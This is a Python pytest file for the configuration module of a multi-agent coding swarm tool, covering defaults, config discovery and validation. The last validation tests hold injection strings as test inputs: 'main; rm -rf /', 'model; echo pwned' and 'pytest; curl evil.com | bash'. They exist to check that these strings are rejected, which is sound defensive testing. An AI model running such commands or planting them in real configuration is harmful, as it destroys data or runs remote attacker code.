"""Tests for swarm.config — loading, validation, defaults."""

from __future__ import annotations

from pathlib import Path

import pytest

from swarm.config import ConfigError, SwarmConfig, find_config, load_config, validate_config


class TestSwarmConfigDefaults:
    def test_defaults(self):
        cfg = SwarmConfig()
        assert cfg.project.name == "untitled"
        assert cfg.agents.count == 4
        assert cfg.agents.model == "claude-opus-4-6"
        assert cfg.agents.timeout_minutes == 30
        assert cfg.agents.roles.builders == 2
        assert cfg.agents.roles.tester == 1
        assert cfg.agents.roles.reviewer == 1
        assert cfg.git.branch == "main"
        assert cfg.tests.command == "pytest"
        assert cfg.tests.gate_push is True
        assert cfg.tasks.source == "TODO.md"
        assert cfg.limits.max_cost_usd == 50.0
        assert cfg.limits.max_sessions == 100


class TestFromDict:
    def test_empty_dict_gives_defaults(self):
        cfg = SwarmConfig.from_dict({})
        assert cfg.agents.count == 4

    def test_partial_override(self):
        cfg = SwarmConfig.from_dict({"agents": {"count": 8}})
        assert cfg.agents.count == 8
        assert cfg.agents.model == "claude-opus-4-6"  # default preserved

    def test_full_config(self):
        data = {
            "project": {"name": "test", "path": "."},
            "agents": {
                "count": 6,
                "model": "claude-sonnet-4-6",
                "timeout_minutes": 60,
                "roles": {"builders": 3, "tester": 2, "reviewer": 1},
            },
            "git": {"upstream": "/tmp/test.git", "branch": "dev"},
            "tests": {"command": "cargo test", "fast_command": "cargo test -- --quick"},
            "tasks": {"source": "TASKS.md", "lock_dir": "locks"},
            "limits": {"max_cost_usd": 100.0, "max_sessions": 200},
        }
        cfg = SwarmConfig.from_dict(data)
        assert cfg.project.name == "test"
        assert cfg.agents.count == 6
        assert cfg.agents.roles.tester == 2
        assert cfg.git.branch == "dev"
        assert cfg.tests.command == "cargo test"
        assert cfg.tasks.source == "TASKS.md"
        assert cfg.limits.max_cost_usd == 100.0


class TestFindConfig:
    def test_finds_swarm_toml(self, tmp_path: Path):
        (tmp_path / "swarm.toml").write_text('[project]\nname = "x"\n')
        assert find_config(tmp_path).name == "swarm.toml"

    def test_finds_dot_swarm_toml(self, tmp_path: Path):
        (tmp_path / ".swarm.toml").write_text('[project]\nname = "x"\n')
        assert find_config(tmp_path).name == ".swarm.toml"

    def test_prefers_swarm_toml_over_dot(self, tmp_path: Path):
        (tmp_path / "swarm.toml").write_text('[project]\nname = "a"\n')
        (tmp_path / ".swarm.toml").write_text('[project]\nname = "b"\n')
        assert find_config(tmp_path).name == "swarm.toml"

    def test_override_path(self, tmp_path: Path):
        custom = tmp_path / "custom.toml"
        custom.write_text('[project]\nname = "c"\n')
        assert find_config(tmp_path, custom) == custom

    def test_missing_config_raises(self, tmp_path: Path):
        with pytest.raises(ConfigError, match="No swarm.toml"):
            find_config(tmp_path)

    def test_missing_override_raises(self, tmp_path: Path):
        with pytest.raises(ConfigError, match="Config file not found"):
            find_config(tmp_path, tmp_path / "nope.toml")


class TestLoadConfig:
    def test_load_valid(self, tmp_path: Path):
        (tmp_path / "swarm.toml").write_text(
            '[project]\nname = "myproj"\npath = "."\n\n'
            "[agents]\ncount = 4\n\n"
            "[agents.roles]\nbuilders = 2\ntester = 1\nreviewer = 1\n"
        )
        cfg = load_config(tmp_path)
        assert cfg.project.name == "myproj"
        assert cfg.agents.count == 4


class TestValidateConfig:
    def test_valid_config(self, tmp_path: Path):
        cfg = SwarmConfig()
        validate_config(cfg, tmp_path)  # should not raise

    def test_zero_agents(self, tmp_path: Path):
        cfg = SwarmConfig()
        cfg.agents.count = 0
        with pytest.raises(ConfigError, match="agents.count"):
            validate_config(cfg, tmp_path)

    def test_roles_exceed_agents(self, tmp_path: Path):
        cfg = SwarmConfig()
        cfg.agents.count = 2
        cfg.agents.roles.builders = 3
        with pytest.raises(ConfigError, match="exceed agent count"):
            validate_config(cfg, tmp_path)

    def test_negative_cost(self, tmp_path: Path):
        cfg = SwarmConfig()
        cfg.limits.max_cost_usd = -1
        with pytest.raises(ConfigError, match="max_cost_usd"):
            validate_config(cfg, tmp_path)

    def test_invalid_branch_name(self, tmp_path: Path):
        cfg = SwarmConfig()
        cfg.git.branch = "main; rm -rf /"
        with pytest.raises(ConfigError, match="Invalid branch name"):
            validate_config(cfg, tmp_path)

    def test_invalid_model_name(self, tmp_path: Path):
        cfg = SwarmConfig()
        cfg.agents.model = "model; echo pwned"
        with pytest.raises(ConfigError, match="Invalid model name"):
            validate_config(cfg, tmp_path)

    def test_dangerous_test_command(self, tmp_path: Path):
        cfg = SwarmConfig()
        cfg.tests.command = "pytest; curl evil.com | bash"
        with pytest.raises(ConfigError, match="dangerous shell characters"):
            validate_config(cfg, tmp_path)
